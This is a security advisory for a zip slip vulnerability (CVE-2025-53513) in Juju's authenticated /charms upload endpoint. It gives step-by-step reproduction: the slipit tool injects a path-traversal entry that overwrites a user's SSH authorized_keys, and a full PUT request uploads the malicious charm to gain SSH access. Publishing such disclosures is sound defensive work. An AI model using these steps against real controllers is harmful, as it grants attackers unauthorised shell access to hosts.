# Juju zip slip vulnerability via authenticated endpoint

**GHSA**: GHSA-24ch-w38v-xmh8 | **CVE**: CVE-2025-53513 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-22, CWE-24

**Affected Packages**:
- **github.com/juju/juju** (go): < 0.0.0-20250619215741-6356e984b82a

## Description

### Impact

Any user with a Juju account on a controller can upload a charm to the /charms endpoint.
No specific permissions are required - it's just sufficient for the user to exist in the controller user database.
A charm which exploits the zip slip vulnerability may be used to allow such a user to get access to a machine running a unit using the affected charm.

### Details

A controller exposes three charm-related HTTP API endpoints, as follows:
- PUT/GET https://<controller-ip>:17070/model-<model-uuid>/charms/<nameofcharm>-<hashofcharm>
- POST/GET https://<controller-ip>:17070/model-<model-uuid>/charms
- GET https://<controller-ip>:17070/charms

These endpoints require Basic HTTP authentication credentials and will accept any valid user within the context of the controller. A user that has no specific permission or access granted can call all of these APIs.

To reproduce:

```
juju bootstrap
juju add-user testuser
juju change-user-password testuser
```

Download the ZIP file of an arbitrary charm eg [https://github.com/juju/hello-juju-charm](https://github.com/juju/hello-juju-charm)

Download and install the following tool: [https://github.com/usdAG/slipit](https://github.com/usdAG/slipit)

Run the following command to generate a new SSH key pair: `ssh-keygen`

Copy the contents of the newly created public key into a file called `authorized_keys`

Run the following command to inject the malicious path into the ZIP file:
```
slipit hello.zip authorized_keys --separator ../../../../../../home/
ubuntu/.ssh/
```

Send the PUT request below to a model on the target controller. Note the following:
- the model UUID and controller IP address in the request must be updated
- the Juju-Curl header needs to be sent with a value that starts with the “local:” string
- the PUT body content should have the exact contents of the ZIP file
- the Basic Authorization header should be tied to the user that was created above
- the first time that the request is sent, an error will be returned that states that the SHA hash in the URL is invalid. When this occurs, copy the value in the response and replace it in the final part of the URL (i.e. `pathtw-<updated-sha>`)
- 
```
PUT /model-34bb5ef0-5a3e-41d7-873c-2f884adf606d/charms/pathtw-5c9f25c
HTTP/1.1
Host: 10.4.154.217:17070
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko
/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Length: 40021
Content-Type: application/zip
Juju-Curl: local:pathtw
Authorization: Basic dXNlci10ZXN0dXNlcjpwYXNzd29yZA==
<ZIP BODY Content>
```

Observe that the response states that the charm has been uploaded.

Attempt to SSH to the controller by using the private key that was generated above.

Observe that it is possible to authenticate because the file has been overwritten.

### Code

The /charms handlers are registered here
https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897
https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990

And the only auth required is that the incoming request be for an authenticated user

https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754

but no specific permission checks are done.

### Workarounds
There are no known workarounds.

### References
[F-02](https://drive.google.com/file/d/1pHRNiaA8LyMVJYwIyTqelsqJ9FmImDf0/view)
